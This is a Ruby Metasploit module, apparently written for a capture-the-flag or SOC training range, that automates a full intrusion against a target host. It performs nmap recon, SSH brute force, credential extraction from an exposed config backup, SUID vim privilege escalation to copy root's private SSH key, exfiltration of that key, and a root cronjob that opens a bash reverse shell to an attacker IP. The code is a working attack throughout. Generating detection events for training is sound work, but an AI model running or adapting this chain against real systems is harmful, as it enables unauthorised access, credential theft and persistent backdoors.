###
# Secure The Network v3 automated attacker module
# This module will recreate the intended attack chain with minimal manual work
# Only use this module on simulated STN virtual networks

# Attack chain:
# - Initial network enumeration with nmap
# - Web enumeration + SSH brute-force
# - Exploit information disclosure vulnerability
# - Login as user via SSH
# - Exploit SUID binary to gain root access
# - Pillage + exfiltrate loot
# - Create backdoor cronjob and systemd service
###

##
# SOC CTF — Full Attack Chain Auxiliary Module
# Chain: nmap recon → SSH brute force (fail2ban) → web enum →
#        info disclosure → SSH foothold → SUID vim privesc →
#        root key exfil → backdoor cronjob
##

require 'msf/core'
require 'net/ssh'
require 'net/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'SOC CTF Full Attack Chain',
      'Description' => 'Automated attack simulation: brute force → info disclosure → foothold → privesc → exfil → persistence',
      'Author'      => ['ctf-author'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RHOSTS,
      Opt::RPORT(22),
      OptInt.new('WEB_PORT',            [true,  'Juice Shop / Caddy port', 80]),
      OptString.new('TARGET_USER',      [true,  'SSH username on target', 'ubuntu']),
      OptString.new('BACKUP_PATH',      [true,  'Path to info-disclosure file', '/backup/config.bak']),
      OptString.new('ATTACKER_IP',      [true,  'Attacker IP for backdoor callback', '']),
      OptInt.new('BACKDOOR_PORT',       [true,  'Callback port for backdoor cronjob', 4444]),
      OptInt.new('FAIL2BAN_WAIT',       [true,  'Seconds to wait after brute force before SSH', 60]),
      OptInt.new('SSH_MAX_RETRIES',     [true,  'Max SSH login retries after ban', 6]),
      OptString.new('WORDLIST',         [true,  'Path to brute force wordlist', '/tmp/ctf_bf.txt']),
      OptString.new('BACKDOOR_MARKER',  [true,  'Crontab idempotency comment marker', 'ctf_backdoor']),
    ])
  end

  # ── Entry point ────────────────────────────────────────────
  def run_host(ip)
    @ip = ip

    phase_0_wordlist
    phase_1_recon
    phase_2_bruteforce
    phase_3_web_enum
    ssh_pass = phase_4_info_disclosure
    session   = phase_5_foothold(ssh_pass)
    phase_6_privesc(session)
    root_key  = phase_7_exfil(session)
    phase_8_backdoor(root_key)
  rescue => e
    fail_with(Failure::Unknown, "Attack chain aborted: #{e.message}")
  end

  # ── Phase 0: write deterministic wordlist ──────────────────
  def phase_0_wordlist
    print_status('[Phase 0] Writing brute force wordlist...')
    words = %w[password 123456 admin letmein welcome dragon master sunshine shadow qwerty iloveyou monkey]
    File.write(datastore['WORDLIST'], words.join("\n") + "\n")
    print_good("Wordlist written → #{datastore['WORDLIST']} (#{words.size} entries)")
  end

  # ── Phase 1: nmap recon ────────────────────────────────────
  def phase_1_recon
    print_status('[Phase 1] Recon (nmap)...')
    ports = "22,#{datastore['WEB_PORT']}"
    cmd   = "nmap -sV -sC -p #{ports} --min-rate=1000 #{@ip}"
    out   = Rex::Compat.capture_output(cmd)
    print_line(out)
    report_note(host: @ip, type: 'nmap_scan', data: out)
    print_good('Recon complete')
  end

  # ── Phase 2: SSH brute force (fail2ban trigger) ────────────
  def phase_2_bruteforce
    print_status('[Phase 2] SSH brute force (expect fail2ban ban)...')
    print_warning('Ban by fail2ban is intentional — generating detection event')

    run_auxiliary_module(
      'auxiliary/scanner/ssh/ssh_login',
      'RHOSTS'       => @ip,
      'RPORT'        => datastore['RPORT'],
      'USERNAME'     => datastore['TARGET_USER'],
      'PASS_FILE'    => datastore['WORDLIST'],
      'BRUTEFORCE_SPEED' => 3,
      'STOP_ON_SUCCESS'  => false,   # exhaust list to trigger fail2ban maxretry
      'VERBOSE'      => false
    )

    print_good('Brute force phase done (ban logged on target)')
  end

  # ── Phase 3: Web enumeration ───────────────────────────────
  def phase_3_web_enum
    print_status('[Phase 3] Web enumeration (headers + dir scan)...')

    # Fingerprint headers / WAF
    headers = http_get_headers("http://#{@ip}:#{datastore['WEB_PORT']}/")
    print_line("    Server headers: #{headers}")
    report_note(host: @ip, type: 'http_headers', data: headers)

    # WAF probe — SQLi string, expect Coraza 403/406
    waf_code = http_status("http://#{@ip}:#{datastore['WEB_PORT']}/?q=1'+OR+'1'='1")
    print_status("    WAF probe → HTTP #{waf_code} (403/406 expected from Coraza)")

    # Directory scan
    run_auxiliary_module(
      'auxiliary/scanner/http/dir_scanner',
      'RHOSTS'     => @ip,
      'RPORT'      => datastore['WEB_PORT'],
      'PATH'       => '/',
      'DICTIONARY' => '/usr/share/wordlists/dirb/common.txt'
    )

    print_good('Web enumeration complete')
  end

  # ── Phase 4: Info disclosure → extract SSH creds ──────────
  def phase_4_info_disclosure
    print_status("[Phase 4] Fetching #{datastore['BACKUP_PATH']}...")

    uri      = URI("http://#{@ip}:#{datastore['WEB_PORT']}#{datastore['BACKUP_PATH']}")
    response = Net::HTTP.get_response(uri)

    fail_with(Failure::UnexpectedReply, "HTTP #{response.code} fetching config.bak") unless response.code == '200'

    body = response.body
    print_good("config.bak retrieved (HTTP 200)")
    print_line(body.lines.map { |l| "    #{l}" }.join)

    # ── Adjust these patterns to match your config.bak format ──
    # Expected example:
    #   ssh_user=ubuntu
    #   ssh_password=S3cr3tP@ssw0rd
    ssh_pass = body.match(/(?:ssh_password|password)\s*[:=]\s*(\S+)/i)&.captures&.first
    fail_with(Failure::NotFound, 'Could not extract SSH password — adjust regex in phase_4_info_disclosure') unless ssh_pass

    print_good("SSH credentials extracted (password redacted from log)")
    report_note(host: @ip, type: 'ssh_creds', data: { user: datastore['TARGET_USER'], pass: ssh_pass })

    ssh_pass
  end

  # ── Phase 5: SSH foothold with retry loop ─────────────────
  def phase_5_foothold(ssh_pass)
    print_status("[Phase 5] SSH foothold as #{datastore['TARGET_USER']} (waiting #{datastore['FAIL2BAN_WAIT']}s for ban expiry)...")
    sleep(datastore['FAIL2BAN_WAIT'])

    session = nil
    datastore['SSH_MAX_RETRIES'].times do |i|
      print_status("    Attempt #{i + 1}/#{datastore['SSH_MAX_RETRIES']} → #{datastore['TARGET_USER']}@#{@ip}")
      begin
        session = ssh_connect(@ip, datastore['TARGET_USER'], ssh_pass)
        break if session
      rescue => e
        print_warning("    Failed (#{e.message}) — retrying in 15s")
        sleep(15)
      end
    end

    fail_with(Failure::NoAccess, "SSH login failed after #{datastore['SSH_MAX_RETRIES']} attempts") unless session

    result = ssh_exec(session, 'id')
    print_good("Foothold established: #{result.strip}")
    report_note(host: @ip, type: 'ssh_foothold', data: result)
    session
  end

  # ── Phase 6: Privesc via SUID vim ─────────────────────────
  def phase_6_privesc(session)
    print_status('[Phase 6] Privesc via SUID vim (GTFOBins)...')

    suid_path = ssh_exec(session, "find /usr -name 'vim*' -perm -4000 2>/dev/null | head -1").strip
    fail_with(Failure::NotFound, 'No SUID vim found — check target setup') if suid_path.empty?
    print_good("SUID binary: #{suid_path}")

    # Write vim Ex commands to a temp file, execute via vim -E -s -S, then clean up.
    # :!sh -pc "..." preserves effective UID (root) when SUID bit is set.
    privesc_cmds = ':!sh -pc "cat /root/.ssh/id_rsa > /tmp/.ctf_exfil"\n:q!\n'
    ssh_exec(session, "printf '#{privesc_cmds}' > /tmp/.vim_privesc && vim -E -s -S /tmp/.vim_privesc /dev/null 2>/dev/null; rm -f /tmp/.vim_privesc")

    print_good('Privesc payload delivered')
  end

  # ── Phase 7: Exfiltrate root SSH key ──────────────────────
  def phase_7_exfil(session)
    print_status('[Phase 7] Exfiltrating root SSH key...')

    root_key = ssh_exec(session, 'cat /tmp/.ctf_exfil 2>/dev/null').strip
    fail_with(Failure::NotFound, 'Root key not found at /tmp/.ctf_exfil — privesc may have failed') if root_key.empty?

    key_path = "#{Msf::Config.loot_directory}/root_id_rsa_#{@ip}"
    File.write(key_path, root_key + "\n")
    File.chmod(0600, key_path)
    print_good("Root key saved → #{key_path}")

    store_loot('root.ssh.key', 'text/plain', @ip, root_key, 'root_id_rsa', 'Exfiltrated root SSH private key')

    # Clean up temp file on target
    ssh_exec(session, 'rm -f /tmp/.ctf_exfil')
    print_good('Target artifact cleaned up')

    root_key
  end

  # ── Phase 8: Backdoor root cronjob ────────────────────────
  def phase_8_backdoor(root_key)
    print_status('[Phase 8] Installing backdoor root cronjob...')

    marker  = datastore['BACKDOOR_MARKER']
    payload = "* * * * * /bin/bash -c \"bash -i >&/dev/tcp/#{datastore['ATTACKER_IP']}/#{datastore['BACKDOOR_PORT']} 0>&1\" # #{marker}"

    # Connect as root with exfiltrated key
    root_session = ssh_connect_with_key(@ip, 'root', root_key)
    fail_with(Failure::NoAccess, 'Could not SSH as root with exfiltrated key') unless root_session

    # Idempotent: strip old marker entries, reinstall cleanly
    install_cmd = "(crontab -l 2>/dev/null | grep -v '#{marker}'; echo '#{payload}') | crontab -"
    ssh_exec(root_session, install_cmd)

    # Verify
    verify = ssh_exec(root_session, "crontab -l 2>/dev/null | grep '#{marker}'").strip
    if verify.empty?
      print_warning('Cronjob verification inconclusive — check manually')
    else
      print_good("Backdoor cronjob verified: #{verify}")
    end

    report_note(host: @ip, type: 'backdoor_cron', data: payload)
  end

  # ── SSH helpers ────────────────────────────────────────────

  def ssh_connect(host, user, pass)
    Net::SSH.start(host, user,
      password:              pass,
      paranoid:              false,
      non_interactive:       true,
      number_of_password_prompts: 0,
      timeout:               10
    )
  end

  def ssh_connect_with_key(host, user, key_data)
    key_file = Rex::Tempfile.new('ctf_root_key')
    key_file.write(key_data)
    key_file.flush
    File.chmod(0600, key_file.path)

    Net::SSH.start(host, user,
      keys:            [key_file.path],
      paranoid:        false,
      non_interactive: true,
      timeout:         10
    )
  ensure
    key_file&.close
    key_file&.unlink
  end

  def ssh_exec(session, cmd)
    output = ''
    session.open_channel do |ch|
      ch.exec(cmd) do |_, success|
        raise "Command failed to exec: #{cmd}" unless success
        ch.on_data        { |_, data| output += data }
        ch.on_extended_data { |_, _, data| output += data }
      end
    end.wait
    output
  end

  def http_get_headers(url)
    uri = URI(url)
    res = Net::HTTP.get_response(uri)
    res.to_hash.map { |k, v| "#{k}: #{v.join(', ')}" }.join(' | ')
  rescue => e
    "error: #{e.message}"
  end

  def http_status(url)
    Net::HTTP.get_response(URI(url)).code
  rescue => e
    "error: #{e.message}"
  end

  # ── MSF module runner helper ───────────────────────────────
  def run_auxiliary_module(mod_path, opts = {})
    mod = framework.modules.create(mod_path)
    fail_with(Failure::NotFound, "Module not found: #{mod_path}") unless mod

    opts.each { |k, v| mod.datastore[k] = v }
    mod.run_simple('RunAsJob' => false, 'LocalInput' => nil, 'LocalOutput' => nil)
  end
end
